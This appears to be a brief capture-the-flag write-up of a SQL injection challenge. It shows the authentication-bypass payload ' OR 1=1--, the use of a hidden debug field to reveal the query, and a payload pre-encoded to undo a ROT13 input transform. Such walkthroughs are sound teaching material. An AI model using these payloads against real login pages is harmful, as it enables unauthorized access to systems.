My Process / Solution

1) I really liked this one. The third and final continuation of this series gives a server-side HTTP 500 error when we enter: ' or 1=1-- 
2) Inspecting the page shows no cookies to manipulate, but there is one input that is hidden between two divs where we can set debug mode from 0 to 1. Doing so and then trying the previous SQL Injection returns:

'''
password: ' OR 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--
'''

Our query has been modified so that OR has become be. Maybe a Caesar cipher?

Trying: ' OR 1=1--abcdefghijklmnopqrstuvwxyz
Results: SQL query: SELECT * FROM admin where password = '' be 1=1--nopqrstuvwxyzabcdefghijklm'

Definitely a Caesar cipher. Trying ' be 1=1-- gives us our flag.
